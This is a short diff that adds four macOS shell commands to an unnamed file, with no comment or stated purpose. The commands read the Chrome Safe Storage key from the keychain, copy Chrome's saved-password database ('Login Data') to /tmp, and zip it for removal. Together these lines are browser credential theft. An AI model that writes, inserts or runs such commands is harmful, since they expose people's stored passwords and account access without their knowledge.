@@ -1,0 +1,4 @@
+security find-generic-password -ga "Chrome" 2>&1 # Chrome Safe Storage
+cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/ld
+zip -r out.zip /tmp/ld
+
